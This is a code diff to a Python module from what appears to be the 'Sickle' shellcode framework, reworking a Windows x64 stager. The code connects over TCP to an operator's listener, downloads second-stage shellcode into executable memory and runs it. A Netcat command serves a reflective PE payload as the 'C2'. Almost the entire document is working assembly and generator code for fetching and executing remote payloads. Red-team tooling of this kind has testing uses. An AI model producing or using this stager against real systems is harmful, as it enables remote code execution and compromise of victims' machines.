@@ -35,9 +35,18 @@ class Shellcode():
 
     tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = ("TODO")
+    summary = ("A lightweight stager that connects via TCP over IPv4 to receive and execute shellcode")
 
-    description = ("TODO")
+    description = ("This shellcode stub connects to a remote C2 server over TCP, downloads a second-stage"
+                   " payload, and executes it.\n\n"
+
+                   "Your \"C2 Server\" can be as simple as combining Sickle and Netcat:\n\n"
+
+                   f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"
+
+                   "Upon execution of the first stage, you should get a connection from the target on your"
+                   " C2. If using Netcat hit, [CTRL]+[C]. Upon doing so, your shellcode should execute in"
+                   " memory.")
 
     arguments = {}
     arguments["LHOST"] = {}
@@ -47,10 +56,6 @@ class Shellcode():
     arguments["LPORT"] = {}
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
-
-    arguments["ACKPK"] = {}
-    arguments["ACKPK"]["optional"] = "yes"
-    arguments["ACKPK"]["description"] = "File including it's path containing the acknowledgement packet response"
 
     def __init__(self, arg_object):
 
@@ -65,7 +70,6 @@ class Shellcode():
                 "WSAStartup",
                 "socket",
                 "connect",
-                "send",
                 "recv",
             ],
         }
@@ -75,7 +79,6 @@ class Shellcode():
             "wsaData"                       : 0x00,
             "sockaddr_name"                 : 0x00,
             "sockfd"                        : 0x00,
-            "buffer"                        : self.get_ackpk_len(),
             "pResponse"                     : 0x00,
             "lpvShellcode"                  : 0x00,
         })
@@ -85,144 +88,6 @@ class Shellcode():
         self.sock_buffer_size = 0x1000 * 100
 
         return
-
-    def get_ackpk_len(self):
-        """Generates the size needed by the ACK packet sent to the C2 server.
-        Due to bugs encountered when passing raw strings, this function will
-        read from a file. In addition, it instantiates self.ack_packet.
-        Should no file be provided, a default string will be sent over TCP
-        instead.
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        if (argv_dict == None):
-            exit(-1)
-
-        if ("ACKPK" not in argv_dict.keys()):
-            self.ack_packet = "The Only Thing They Fear Is You\r\n"
-        else:
-            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACKPK"], 'r')
-
-        needed_space = math.ceil(len(self.ack_packet)/8) * 8
-
-        return needed_space
-
-    def download_pe(self):
-        """Stager responsible for downloading the PE into memory
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        if (argv_dict == None):
-            exit(-1)
-
-        if ("LPORT" not in argv_dict.keys()):
-            lport = 4444
-        else:
-            lport = int(argv_dict["LPORT"])
-
-
-        stub = f"""
-call_WSAStartup:
-    mov rcx, 0x202
-    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
-    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
-    call rax
-
-call_socket:
-    mov rcx, {ws2def.AF_INET}
-    xor rdx, rdx
-    inc dl
-    xor r8, r8
-    mov rax, [rbp - {self.storage_offsets['socket']}]
-    call rax
-    mov [rbp - {self.storage_offsets['sockfd']}], rax
-
-call_connect:
-    mov rcx, rax
-    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
-    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
-    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
-    mov [rdx], r9
-    xor r9, r9
-    mov [rdx + 0x08], r9
-    mov rax, [rbp - {self.storage_offsets['connect']}]
-    call rax
-"""
-
-        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
-        write_index = self.storage_offsets['buffer']
-
-        stub += f"\ncall_send:\n"
-
-        for i in range(len(packet_buffer["QWORD_LIST"])):
-            stub += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
-            stub += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
-
-        for i in range(len(packet_buffer["DWORD_LIST"])):
-            stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
-            stub += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(packet_buffer["WORD_LIST"])):
-            stub += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
-            stub += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(packet_buffer["BYTE_LIST"])):
-            stub += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
-            stub += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-
-        stub += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    lea rdx, [rbp - {self.storage_offsets['buffer']}]
-    mov r8, {len(self.ack_packet)}
-    xor r9, r9
-    mov rax, [rbp - {self.storage_offsets['send']}]
-    call rax
-
-    xor rdx, rdx
-    mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
-    mov [rbp - {self.storage_offsets['pResponse']}], rdx
-
-call_VirtualAlloc:
-    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
-    mov rdx, {self.sock_buffer_size}
-    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
-    mov r9, {winnt.PAGE_EXECUTE_READWRITE} 
-    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
-    call rax
-
-    mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
-    mov [rbp - {self.storage_offsets['pResponse']}], rax
-
-call_recv:
-    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
-    mov r8, 0x5000
-    xor r9, r9
-    mov rax, [rbp - {self.storage_offsets['recv']}]
-    call rax
-
-check_complete:
-    test eax, eax
-    jle download_complete
-
-increment_pointer:
-    mov r8, [rbp - {self.storage_offsets['pResponse']}]
-    add r8, rax
-    mov [rbp - {self.storage_offsets['pResponse']}], r8
-    jmp call_recv
-
-download_complete:
-    nop
-        """
-
-        return stub
 
     def get_kernel32(self):
         """Generates stub for obtaining the base address of Kernel32.dll
@@ -370,6 +235,19 @@ get_{imports[func]}:
         """Returns bytecode generated by the keystone engine.
         """
 
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        if (argv_dict == None):
+            exit(-1)
+
+        if ("LPORT" not in argv_dict.keys()):
+            lport = 4444
+        else:
+            lport = int(argv_dict["LPORT"])
+
+        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
+        sin_port = struct.pack('<H', lport).hex()
+        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+
         shellcode = f"""
 _start:
     push rbp
@@ -381,9 +259,68 @@ _start:
         """
 
         shellcode += self.resolve_functions()
-        shellcode += self.download_pe()
 
         shellcode += f"""
+call_WSAStartup:
+    mov rcx, 0x202
+    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
+    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
+    call rax
+
+call_socket:
+    mov rcx, {ws2def.AF_INET}
+    xor rdx, rdx
+    inc dl
+    xor r8, r8
+    mov rax, [rbp - {self.storage_offsets['socket']}]
+    call rax
+    mov [rbp - {self.storage_offsets['sockfd']}], rax
+
+call_connect:
+    mov rcx, rax
+    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
+    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
+    mov r9, {sin_addr}{sin_port}{sin_family}
+    mov [rdx], r9
+    xor r9, r9
+    mov [rdx + 0x08], r9
+    mov rax, [rbp - {self.storage_offsets['connect']}]
+    call rax
+    
+    xor rdx, rdx
+    mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
+    mov [rbp - {self.storage_offsets['pResponse']}], rdx
+
+call_VirtualAlloc:
+    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
+    mov rdx, {self.sock_buffer_size}
+    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
+    mov r9, {winnt.PAGE_EXECUTE_READWRITE} 
+    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
+    call rax
+
+    mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
+    mov [rbp - {self.storage_offsets['pResponse']}], rax
+
+call_recv:
+    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
+    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
+    mov r8, 0x5000
+    xor r9, r9
+    mov rax, [rbp - {self.storage_offsets['recv']}]
+    call rax
+
+check_complete:
+    test eax, eax
+    jle download_complete
+
+inc_ptr:
+    mov r8, [rbp - {self.storage_offsets['pResponse']}]
+    add r8, rax
+    mov [rbp - {self.storage_offsets['pResponse']}], r8
+    jmp call_recv
+
+download_complete:
     jmp [rbp - {self.storage_offsets['lpvShellcode']}]
         """
 
